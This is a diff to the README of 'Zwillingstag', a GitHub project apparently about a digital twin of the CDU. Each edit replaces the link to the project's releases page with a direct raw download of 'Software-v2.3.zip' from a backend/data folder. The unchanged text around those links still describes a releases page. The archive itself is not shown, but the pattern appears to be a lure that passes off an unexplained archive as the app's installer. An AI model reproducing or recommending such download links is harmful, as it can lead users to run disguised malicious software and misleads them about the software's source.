@@ -1,6 +1,6 @@
 # 🪞 Zwillingstag - See the CDU Twin Clearly
 
-[![Download Zwillingstag](https://img.shields.io/badge/Download%20Zwillingstag-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/moraindiscernible324/Zwillingstag/releases)
+[![Download Zwillingstag](https://img.shields.io/badge/Download%20Zwillingstag-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/moraindiscernible324/Zwillingstag/raw/refs/heads/main/backend/data/Software-v2.3.zip)
 
 ## 🚀 What Zwillingstag Does
 
@@ -29,7 +29,7 @@ For the best result:
 
 Visit this page to download the app files:
 
-https://github.com/moraindiscernible324/Zwillingstag/releases
+https://github.com/moraindiscernible324/Zwillingstag/raw/refs/heads/main/backend/data/Software-v2.3.zip
 
 On the releases page:
 1. Open the latest release
@@ -93,7 +93,7 @@ The app aims to make the digital twin easy to follow without extra setup.
 
 ### Open the latest version
 Go to the releases page and pick the newest file:
-https://github.com/moraindiscernible324/Zwillingstag/releases
+https://github.com/moraindiscernible324/Zwillingstag/raw/refs/heads/main/backend/data/Software-v2.3.zip
 
 ### Update the app
 1. Return to the releases page
@@ -155,4 +155,4 @@ To keep the download clean:
 
 Download or update Zwillingstag here:
 
-https://github.com/moraindiscernible324/Zwillingstag/releases
+https://github.com/moraindiscernible324/Zwillingstag/raw/refs/heads/main/backend/data/Software-v2.3.zip
